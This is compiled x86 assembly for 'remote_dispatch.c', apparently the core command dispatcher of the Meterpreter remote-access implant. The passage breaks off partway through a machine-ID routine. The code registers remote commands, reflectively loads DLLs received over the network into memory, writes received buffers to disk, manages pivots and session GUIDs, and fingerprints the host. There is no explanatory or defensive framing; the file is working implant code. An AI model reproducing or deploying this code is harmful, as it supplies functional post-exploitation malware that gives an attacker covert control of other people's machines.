	.file	"remote_dispatch.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$1072, %esp
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, 16(%esp)
	movl	$LC0, 12(%esp)
	movl	$1023, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snprintf_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	movl	%eax, -12(%ebp)
	leal	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %ecx
	movl	$1021, %eax
	subl	-12(%ebp), %eax
	movl	%eax, %edx
	movl	$1024, %eax
	subl	-12(%ebp), %eax
	leal	-1040(%ebp), %esi
	movl	-12(%ebp), %ebx
	addl	%esi, %ebx
	movl	%ecx, 16(%esp)
	movl	8(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%ebx, (%esp)
	call	_vsnprintf_s
	movl	$LC1, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__strcat_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__OutputDebugStringA@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leal	-8(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.globl	_gExtensionList
	.bss
	.align 4
_gExtensionList:
	.space 4
	.globl	_customCommands
	.data
	.align 32
_customCommands:
	.long	12
	.long	_request_core_loadlib
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	10
	.long	_request_core_enumextcmd
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	13
	.long	_request_core_machine_id
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	11
	.long	_request_core_get_session_guid
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	21
	.long	_request_core_set_session_guid
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	22
	.long	_request_core_set_uuid
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	18
	.long	_request_core_pivot_add
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	19
	.long	_request_core_pivot_remove
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	17
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	_request_core_patch_url
	.long	0
	.space 60
	.long	0
	.space 8
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.text
	.globl	_buffer_to_file
	.def	_buffer_to_file;	.scl	2;	.type	32;	.endef
_buffer_to_file:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, 24(%esp)
	movl	$128, 20(%esp)
	movl	$1, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1073741824, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CreateFileA@28, %eax
	call	*%eax
	subl	$28, %esp
	movl	%eax, -24(%ebp)
	cmpl	$-1, -24(%ebp)
	jne	L3
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L4
L3:
	movl	16(%ebp), %eax
	movl	%eax, -20(%ebp)
	jmp	L5
L7:
	movl	-28(%ebp), %eax
	subl	%eax, -20(%ebp)
	movl	-28(%ebp), %eax
	addl	%eax, -16(%ebp)
L5:
	cmpl	$0, -20(%ebp)
	je	L6
	movl	12(%ebp), %edx
	movl	-16(%ebp), %eax
	addl	%eax, %edx
	movl	$0, 16(%esp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteFile@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L7
L6:
	movl	$0, -12(%ebp)
L4:
	cmpl	$-1, -24(%ebp)
	je	L8
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L8:
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC2:
	.ascii "[LISTEXTCMD] Processing extension: %p\0"
	.align 4
LC3:
	.ascii "[LISTEXTCMD] Adding command ID %u\0"
	.text
	.globl	_ext_cmd_callback
	.def	_ext_cmd_callback;	.scl	2;	.type	32;	.endef
_ext_cmd_callback:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	$0, -12(%ebp)
	cmpl	$0, -16(%ebp)
	je	L11
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L11
	cmpl	$0, 12(%ebp)
	je	L11
	movl	12(%ebp), %eax
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, -12(%ebp)
	jmp	L12
L14:
	movl	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC2, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	4(%eax), %edx
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	cmpl	%eax, %edx
	jnb	L13
	movl	-12(%ebp), %eax
	movl	(%eax), %edx
	movl	-16(%ebp), %eax
	movl	8(%eax), %eax
	cmpl	%eax, %edx
	jnb	L13
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC3, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	(%eax), %edx
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	movl	%edx, 8(%esp)
	movl	$131083, 4(%esp)
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
L13:
	movl	-12(%ebp), %eax
	movl	156(%eax), %eax
	movl	%eax, -12(%ebp)
L12:
	movl	-20(%ebp), %eax
	movl	24(%eax), %eax
	cmpl	%eax, -12(%ebp)
	jne	L14
L11:
	movl	$0, %eax
	leave
	ret
	.globl	_request_core_patch_url
	.def	_request_core_patch_url;	.scl	2;	.type	32;	.endef
_request_core_patch_url:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L17
	movl	16(%ebp), %eax
	movl	$5023, (%eax)
	jmp	L18
L17:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	$65967, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	-12(%ebp), %edx
	movl	%eax, 28(%edx)
	movl	16(%ebp), %eax
	movl	$0, (%eax)
L18:
	movl	$1, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC4:
	.ascii "[LISTEXTCMD] Listing extension commands between %u and %u\0"
	.text
	.globl	_request_core_enumextcmd
	.def	_request_core_enumextcmd;	.scl	2;	.type	32;	.endef
_request_core_enumextcmd:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L21
	movl	-16(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	$131083, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -24(%ebp)
	movl	$131097, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	-24(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %edx
	movl	-24(%ebp), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC4, (%esp)
	call	_real_dprintf
	movl	_gExtensionList, %eax
	leal	-28(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$_ext_cmd_callback, 4(%esp)
	movl	%eax, (%esp)
	call	_list_enumerate
	movl	%eax, -12(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
L21:
	movl	$0, %eax
	leave
	ret
	.def	_deinit_server_extension;	.scl	3;	.type	32;	.endef
_deinit_server_extension:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$_customCommands, (%esp)
	call	_command_deregister_all
	call	_deregister_base_dispatch_routines
	movl	$0, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC5:
	.ascii "[CORE] Registered the core pseudo extension %p\0"
	.text
	.globl	_register_dispatch_routines
	.def	_register_dispatch_routines;	.scl	2;	.type	32;	.endef
_register_dispatch_routines:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	call	_list_create
	movl	%eax, _gExtensionList
	call	_register_base_dispatch_routines
	movl	%eax, -12(%ebp)
	movl	$_customCommands, (%esp)
	call	_command_register_all
	movl	$28, (%esp)
	call	_malloc
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L27
	movl	$28, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-16(%ebp), %eax
	movl	$_deinit_server_extension, 8(%eax)
	movl	-16(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 24(%eax)
	movl	_extensionCommands, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 20(%eax)
	movl	_gExtensionList, %eax
	movl	-16(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_list_push
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC5, (%esp)
	call	_real_dprintf
L27:
	nop
	leave
	ret
	.globl	_deregister_dispatch_routines
	.def	_deregister_dispatch_routines;	.scl	2;	.type	32;	.endef
_deregister_dispatch_routines:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
L32:
	movl	_gExtensionList, %eax
	movl	%eax, (%esp)
	call	_list_pop
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L34
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L31
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
L31:
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	jmp	L32
L34:
	nop
	movl	_gExtensionList, %eax
	movl	%eax, (%esp)
	call	_list_destroy
	nop
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC6:
	.ascii "[STAGELESSINIT] searching for extension init for %u in %p\0"
	.align 4
LC7:
	.ascii "[STAGELESSINIT] extension list start is %p\0"
	.align 4
LC8:
	.ascii "[STAGELESSINIT] passing stageless init\0"
	.text
	.globl	_stagelessinit_extension
	.def	_stagelessinit_extension;	.scl	2;	.type	32;	.endef
_stagelessinit_extension:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	_gExtensionList, %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC6, (%esp)
	call	_real_dprintf
	movl	_gExtensionList, %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC7, (%esp)
	call	_real_dprintf
	movl	_gExtensionList, %eax
	movl	(%eax), %eax
	movl	%eax, -12(%ebp)
	jmp	L36
L38:
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L37
	movl	$LC8, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	movl	16(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
L37:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -12(%ebp)
L36:
	cmpl	$0, -12(%ebp)
	jne	L38
	movl	$0, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC9:
	.ascii "[SERVER] Initialising extension %x\0"
	.align 4
LC10:
	.ascii "[SERVER] Calling init on extension, address is 0x%p\0"
LC11:
	.ascii "[SERVER] Calling init()...\0"
LC12:
	.ascii "[SERVER] Called init()...\0"
	.align 4
LC13:
	.ascii "[LOAD EXTENSION] Adding command ID to response: %u\0"
	.text
	.globl	_load_extension
	.def	_load_extension;	.scl	2;	.type	32;	.endef
_load_extension:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$14, -12(%ebp)
	movl	$28, (%esp)
	call	_malloc
	movl	%eax, -28(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC9, (%esp)
	call	_real_dprintf
	cmpl	$0, -28(%ebp)
	je	L41
	movl	$28, 8(%esp)
	movl	$0, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-28(%ebp), %eax
	movl	8(%ebp), %edx
	movl	%edx, (%eax)
	cmpl	$0, 12(%ebp)
	je	L42
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 4(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 8(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$5, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 12(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$4, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 16(%edx)
	jmp	L43
L42:
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 4(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 8(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$5, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 12(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$4, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 16(%edx)
L43:
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC10, (%esp)
	call	_real_dprintf
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L44
	movl	$LC11, (%esp)
	call	_real_dprintf
	movl	-28(%ebp), %eax
	movl	24(%ebp), %edx
	movl	%edx, 24(%eax)
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	movl	_met_api, %edx
	movl	16(%ebp), %ecx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	_extensionCommands, %edx
	movl	-28(%ebp), %eax
	movl	%edx, 20(%eax)
	cmpl	$0, -12(%ebp)
	jne	L45
	movl	-28(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L46
	movl	-28(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, -16(%ebp)
	jmp	L47
L48:
	movl	-28(%ebp), %eax
	movl	12(%eax), %eax
	movl	-16(%ebp), %edx
	movl	(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	-16(%ebp), %eax
	movl	156(%eax), %eax
	movl	%eax, -16(%ebp)
L47:
	cmpl	$0, -16(%ebp)
	jne	L48
L46:
	movl	_gExtensionList, %eax
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_list_push
	jmp	L44
L45:
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L44:
	movl	$LC12, (%esp)
	call	_real_dprintf
	cmpl	$0, 20(%ebp)
	je	L41
	movl	-28(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, -20(%ebp)
	jmp	L49
L53:
	movl	-20(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC13, (%esp)
	call	_real_dprintf
	movl	-20(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131083, 4(%esp)
	movl	20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	_gExtensionList, %eax
	movl	(%eax), %eax
	movl	%eax, -24(%ebp)
	jmp	L50
L52:
	movl	-24(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	cmpl	-28(%ebp), %eax
	je	L51
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L51
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	-20(%ebp), %edx
	movl	(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
L51:
	movl	-24(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -24(%ebp)
L50:
	cmpl	$0, -24(%ebp)
	jne	L52
	movl	-20(%ebp), %eax
	movl	156(%eax), %eax
	movl	%eax, -20(%ebp)
L49:
	movl	-28(%ebp), %eax
	movl	24(%eax), %eax
	cmpl	%eax, -20(%ebp)
	jne	L53
L41:
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
LC14:
	.ascii "[LOADLIB] here 1\0"
LC15:
	.ascii "[LOADLIB] here 2\0"
LC16:
	.ascii "[LOADLIB] here 3\0"
LC17:
	.ascii "[LOADLIB] here 4\0"
LC18:
	.ascii "[LOADLIB] here 5\0"
LC19:
	.ascii "[LOADLIB] here 6\0"
LC20:
	.ascii "[LOADLIB] here 7\0"
LC21:
	.ascii "[LOADLIB] here 8\0"
LC22:
	.ascii "[LOADLIB] here 9\0"
LC23:
	.ascii "[LOADLIB] here 10\0"
LC24:
	.ascii "[LOADLIB] here 11\0"
	.text
	.globl	_request_core_loadlib
	.def	_request_core_loadlib;	.scl	2;	.type	32;	.endef
_request_core_loadlib:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$88, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -28(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -24(%ebp)
	movl	$LC14, (%esp)
	call	_real_dprintf
	movl	_extensionCommands, %eax
	movl	%eax, -36(%ebp)
	movl	$LC15, (%esp)
	call	_real_dprintf
	movl	$65936, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -20(%ebp)
	movl	$LC16, (%esp)
	call	_real_dprintf
	movl	$131099, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -32(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L56
	movl	$87, -12(%ebp)
	jmp	L57
L56:
	movl	$LC17, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	andl	$4, %eax
	testl	%eax, %eax
	jne	L58
	movl	$LC18, (%esp)
	call	_real_dprintf
	leal	-56(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262170, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv
	testl	%eax, %eax
	jne	L59
	movl	$65937, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -40(%ebp)
	cmpl	$0, -40(%ebp)
	jne	L60
L59:
	movl	$87, -12(%ebp)
	jmp	L57
L60:
	movl	$LC19, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	andl	$1, %eax
	testl	%eax, %eax
	jne	L61
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_reflective_loader
	movl	%eax, -44(%ebp)
	movl	$LC20, (%esp)
	call	_real_dprintf
	movl	-56(%ebp), %edx
	movl	-48(%ebp), %eax
	movl	-44(%ebp), %ecx
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_LoadLibraryR@12
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	movl	$LC21, (%esp)
	call	_real_dprintf
	cmpl	$0, -16(%ebp)
	jne	L62
	movl	-56(%ebp), %edx
	movl	-48(%ebp), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_libloader_load_library
	movl	%eax, -16(%ebp)
	jmp	L63
L62:
	movl	$1, -24(%ebp)
L63:
	movl	$LC22, (%esp)
	call	_real_dprintf
	cmpl	$0, -16(%ebp)
	je	L64
	movl	$0, %eax
	jmp	L65
L64:
	movl	$1168, %eax
L65:
	movl	%eax, -12(%ebp)
	jmp	L66
L61:
	movl	-56(%ebp), %edx
	movl	-48(%ebp), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_buffer_to_file
	movl	%eax, -12(%ebp)
L66:
	movl	-40(%ebp), %eax
	movl	%eax, -20(%ebp)
L58:
	cmpl	$0, -12(%ebp)
	jne	L71
	cmpl	$0, -16(%ebp)
	jne	L68
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__LoadLibraryA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L68
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
L68:
	movl	-32(%ebp), %eax
	andl	$2, %eax
	testl	%eax, %eax
	je	L57
	cmpl	$0, -16(%ebp)
	je	L57
	movl	-36(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_load_extension
	movl	%eax, -12(%ebp)
	jmp	L57
L71:
	nop
L57:
	movl	$LC23, (%esp)
	call	_real_dprintf
	cmpl	$0, -28(%ebp)
	je	L69
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L69:
	movl	$LC24, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_request_core_set_uuid
	.def	_request_core_set_uuid;	.scl	2;	.type	32;	.endef
_request_core_set_uuid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -12(%ebp)
	movl	$0, -20(%ebp)
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262605, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L73
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	leal	16(%eax), %edx
	movl	$16, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
L73:
	cmpl	$0, -12(%ebp)
	je	L74
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
L74:
	movl	$0, %eax
	leave
	ret
	.globl	_request_core_get_session_guid
	.def	_request_core_get_session_guid;	.scl	2;	.type	32;	.endef
_request_core_get_session_guid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L77
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$32, %eax
	movl	$16, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
L77:
	movl	$0, %eax
	leave
	ret
	.globl	_request_core_set_session_guid
	.def	_request_core_set_session_guid;	.scl	2;	.type	32;	.endef
_request_core_set_session_guid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	$0, -20(%ebp)
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L80
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	leal	32(%eax), %edx
	movl	$16, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	jmp	L81
L80:
	movl	$160, -12(%ebp)
L81:
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	$0, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC25:
	.ascii "[CORE] Running request_core_machine_id\0"
LC26:
	.ascii "[CORE] response is %p\0"
	.align 2
LC27:
	.ascii "%\0"
	.ascii "0\0"
	.ascii "4\0x\0-\0%\0"
	.ascii "0\0"
	.ascii "4\0x\0:\0%\0s\0\0\0"
LC28:
	.ascii "[CORE] sending machine id: %S\0"
	.text
	.globl	_request_core_machine_id
	.def	_request_core_machine_id;	.scl	2;	.type	32;	.endef
_request_core_machine_id:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$1112, %esp
	movl	$0, -12(%ebp)
	movl	$LC25, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC26, (%esp)
	call	_real_dprintf
	cmpl	$0, -16(%ebp)
	je	L84
	movl	$260, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetSystemDirectoryA@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L85
	movl	$260, -24(%ebp)
	movl	$92, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcschr
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	addl	$2, %eax
	movw	$0, (%eax)
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	$0, 20(%esp)
	movl	$0, 16(%esp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetVolumeInformationA@32, %eax
	call	*%eax
	subl	$32, %esp
	leal	-24(%ebp), %eax
